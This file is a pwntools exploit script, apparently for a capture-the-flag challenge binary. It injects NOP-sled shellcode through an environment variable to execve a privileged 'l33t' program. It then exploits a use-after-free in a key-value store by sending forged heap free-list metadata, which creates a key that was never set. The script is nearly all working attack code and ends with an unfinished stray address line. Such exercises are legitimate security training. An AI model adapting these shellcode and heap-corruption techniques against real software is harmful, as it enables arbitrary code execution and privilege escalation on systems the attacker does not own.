#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./8AAAAAAA
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './8AAAAAAA')
# exe = context.binary = ELF(args.EXE or '/var/challenge/level8/8')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

l33tpath = '/usr/local/bin/l33t'
shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode

payload = fit({
    0: shellcode,
})

# Start with a custom empty env
env = {
    "SHOULD_NOT_SEE": "yes",
    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
}

shellcode_addr = (0x7fffffffeec8 + 50)
shellcode_addr_packed = p64(shellcode_addr)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        env["L33T"] = shellcode
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

# allocate small buffer
io.sendline(b"s a=" + 60 * b"A")
io.sendline(b"s b=" + 60 * b"B")

# reallocate them with a larger value (causes a free with dangling pointer in the pairs array)
io.sendline(b"s a=" + 145 * b"D")
# 62 filler bytes, then the alloc metadata (32 bytes), then the new key data (value not important)
struct_size = 8 * b"\0"
free_prev_ptr = 8 * b"\1"
free_next_ptr = 8 * b"\2"
block_prev_ptr = 8 * b"\3"
struct_metadata = struct_size + free_prev_ptr + free_next_ptr + block_prev_ptr
io.sendline(b"s b=" + 62 * b"E" + struct_metadata + b"newkey=mysexytestest" + 31 * b"X")
# now you can "g newkey" and it wilkl work, even tho it was not added with "s" 





# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()



# entry at 0x7f641604b060
# 0x7f196790a060
0x7f3a4ba86060